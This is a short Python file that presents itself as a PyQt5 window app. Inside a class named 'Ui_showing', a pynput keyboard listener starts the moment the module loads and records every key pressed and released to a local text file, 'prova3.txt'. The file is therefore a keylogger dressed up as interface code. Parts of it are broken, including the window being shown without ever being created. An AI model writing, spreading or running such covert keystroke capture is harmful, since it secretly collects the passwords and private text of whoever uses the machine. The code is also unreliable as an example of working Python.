from pynput import keyboard
from PyQt5.QtWidgets import * 
import os
from PyQt5 import QtCore  , QtGui , QtWidgets , uic


class MyWindow(QtWidgets.QMainWindow):
    def __init__(self) :
        super(MyWindow,self).__init__()
        uic.loadUi('start.ui', self)

        


if os.path.exists("prova3.txt"):
    f = open("prova3.txt", "a")
else:
    f = open("prova3.txt", "x")

    
class Ui_showing(object):
    
    def __init__(self) :
        super().__init__()
      
    def on_press(key):
        try:
            f.writelines("///key [ {0} ] pressed ///".format(
                key.char))
        except AttributeError:
            f.writelines("///special key {0} pressed///".format(
                key))
            f.flush()

    def on_release(key):
        text = ("///key [ {0} ] released ///".format(
            key))
        f.writelines(f'{text} \n')
        f.flush()

    with keyboard.Listener(
            on_press=on_press,
            on_release=on_release) as listener:
        listener.join()

    f.close()

    # def openFileDialog(self):
    #     f = QFileDialog.getOpenFileName(self,'Open File')

    #     if f[0]:
    #         f = open(f[0],'r')

    #         with f:
    #             data = f.read()
    #             self.textedit.setText(data)
                
                
if __name__ == '__main__':
    import sys
    app = QtWidgets.QApplication(sys.argv)
    window = MyWindow
    window.show()
    sys.exit(app.exec_())
    
        


